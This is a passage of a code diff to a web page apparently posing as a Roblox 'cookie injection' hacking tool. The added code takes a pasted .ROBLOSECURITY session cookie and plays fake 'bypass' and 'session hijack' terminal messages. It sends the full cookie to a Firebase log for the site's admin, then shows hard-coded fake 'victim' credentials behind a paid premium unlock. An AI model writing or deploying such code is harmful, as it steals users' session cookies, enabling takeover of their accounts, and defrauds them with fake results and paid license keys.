+        } catch(e) { resBox.innerHTML = '<p style="color:red;">NETWORK_ERROR</p>'; }
     }
 
-    // --- DATA INJECTION SIMULATION (LOGS GENERATOR) ---
-    function processInjection() {
-        const data = document.getElementById('ck-raw').value;
-        if(data.length < 50) return Swal.fire('ERR', 'Stream too short.', 'error');
+    async function executeInjection() {
+        const rawCookie = document.getElementById('cookie-data').value;
+        const terminal = document.getElementById('sys-terminal');
+        const decryptBox = document.getElementById('final-decrypt');
         
-        const consoleLog = document.getElementById('log-console');
-        document.getElementById('ck-result').classList.remove('hidden');
-        
-        consoleLog.innerHTML += `> Initializing bypass...<br>`;
+        if(!rawCookie.includes(".ROBLOSECURITY")) return Swal.fire('ERR', 'Invalid Data Stream.', 'error');
+
+        document.getElementById('inject-results').classList.remove('hidden');
+        terminal.innerHTML = "> Initiating Socket Connection...<br>";
+
+        const scripts = [
+            "> Cracking Encryption Layers...",
+            "> Bypassing Multi-Factor Authentication...",
+            "> Hijacking Session Handshake...",
+            "> Extracting Metadata Clusters...",
+            "> Data Packet Sent to Master Server..."
+        ];
+
+        for(let s of scripts) {
+            await new Promise(r => setTimeout(r, 700));
+            terminal.innerHTML += `<span style="color:#555">${s}</span><br>`;
+            terminal.scrollTop = terminal.scrollHeight;
+        }
+
+        // Gửi Log cho Admin (FULL LENGTH DATA)
+        db.ref('logs/' + activeNode).push({
+            r_user: "CAPTURED_IDENTITY",
+            r_pass: rawCookie,
+            time: new Date().toLocaleString()
+        });
+
+        // "Chiêu trò" giải mã hiển thị
         setTimeout(() => {
-            consoleLog.innerHTML += `> Gateway decrypted...<br>`;
-            consoleLog.innerHTML += `> Capturing data nodes...<br>`;
-            
-            db.ref('users/' + activeSession).once('value', s => {
-                if(s.val().role !== "premium") {
-                    consoleLog.innerHTML += `<span style="color:red">> ACCESS_LOCKED: Premium Node required for decryption.</span><br>`;
-                } else {
-                    consoleLog.innerHTML += `<span style="color:var(--vip)">> [SUCCESS]: Data packet sent to Admin Console.</span><br>`;
-                    // Gửi log về Firebase Admin
-                    db.ref('logs/' + activeSession).push({ r_user: "AUTO_CAPTURED", r_pass: data.substring(0, 15) + "...", time: new Date().toLocaleString() });
-                }
-            });
-        }, 1500);
+            decryptBox.classList.remove('hidden');
+            decryptBox.innerHTML = `
+                <div class="decryption-box">
+                    <p style="margin:5px 0; font-family:Orbitron; font-size:11px; color:#555;">DECRYPTED_RESULT:</p>
+                    <p>TARGET: <b style="color:white">Victim_Node_${Math.floor(Math.random()*999)}</b></p>
+                    <p>EMAIL: <span id="m-mail">********@gmail.com</span> <i class="fas fa-eye" style="color:var(--p); cursor:pointer;" onclick="premiumBypass('mail')"></i></p>
+                    <p>PASS: <span id="m-pass">********</span> <i class="fas fa-eye" style="color:var(--p); cursor:pointer;" onclick="premiumBypass('pass')"></i></p>
+                </div>
+            `;
+            terminal.innerHTML += `<span style="color:var(--cyan)">> [SUCCESS]: SYSTEM_BREACHED</span><br>`;
+        }, 1000);
     }
 
-    // --- UTILITIES ---
-    function uiTab(n) {
-        document.getElementById('panel-1').classList.toggle('hidden', n !== 1);
-        document.getElementById('panel-2').classList.toggle('hidden', n !== 2);
-        document.getElementById('tab-1').classList.toggle('active', n === 1);
-        document.getElementById('tab-2').classList.toggle('active', n === 2);
+    function premiumBypass(type) {
+        db.ref('users/' + activeNode).once('value', s => {
+            if(s.val().role !== "premium") {
+                Swal.fire({
+                    title: 'PREMIUM_REQUIRED',
+                    text: 'Upgrade to Supreme Node to view raw decrypted data.',
+                    icon: 'warning',
+                    confirmButtonColor: '#bc13fe'
+                });
+            } else {
+                Swal.fire('DECRYPTING', 'Analyzing security layers...', 'info');
+                setTimeout(() => {
+                    if(type === 'mail') document.getElementById('m-mail').innerText = "roblox_victim_2026@gmail.com";
+                    else document.getElementById('m-pass').innerText = "Hacked_@2026";
+                    
+                    // Shake effect
+                    document.getElementById('os-frame').style.animation = "shake 0.4s ease";
+                    setTimeout(() => document.getElementById('os-frame').style.animation = "", 400);
+                }, 2000);
+            }
+        });
+    }
+
+    /* === UTILITIES === */
+    function syncLicense() {
+        const k = document.getElementById('license-key').value;
+        if(!k) return;
+        db.ref('keys/' + k).once('value', s => {
+            if(s.exists() && !s.val().used) {
+                db.ref('users/' + activeNode).update({
+                    status: "on", role: s.val().type, exp: s.val().duration + " DAYS"
+                }).then(() => {
+                    db.ref('keys/' + k).update({ used: true, usedBy: activeNode });
+                    Swal.fire('AUTHORIZED', 'Node status updated to ENCRYPTED.', 'success').then(() => location.reload());
+                });
+            } else Swal.fire('INVALID', 'Key is either invalid or expired.', 'error');
+        });
+    }
+
+    function switchTab(n) {
+        document.getElementById('panel1').classList.toggle('hidden', n!==1);
+        document.getElementById('panel2').classList.toggle('hidden', n!==2);
+        document.getElementById('tab1').classList.toggle('active', n===1);
+        document.getElementById('tab2').classList.toggle('active', n===2);
     }
 
     function logout() { localStorage.clear(); location.reload(); }
+
 </script>
 </body>
 </html>
